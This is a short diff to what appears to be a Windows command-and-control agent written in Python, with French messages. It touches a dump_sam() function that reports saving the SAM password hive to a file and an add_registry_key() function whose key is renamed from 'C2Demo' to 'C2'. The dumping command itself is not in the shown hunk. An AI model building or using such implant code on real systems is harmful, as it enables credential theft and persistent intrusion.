@@ -66,11 +66,11 @@ def dump_sam():
     
     if result.returncode == 0:
         return {"status": "ok", "message": "SAM sauvegarde dans sam_dump.hive"}
-    return {"status": "error", "message": "Acces refuse jcrois"}
+    return {"status": "error", "message": "Acces refuse jcrois, il faut les droits admin"}
 
 
 def add_registry_key():
-    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\C2Demo")
+    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\C2")
     winreg.SetValueEx(key, "installed", 0, winreg.REG_SZ, "true")
     winreg.CloseKey(key)
-    return {"status": "ok", "message": "Cle ajoutee: HKCU\\Software\\C2Demo"}
+    return {"status": "ok", "message": "Cle ajoutee: HKCU\\Software\\C2"}
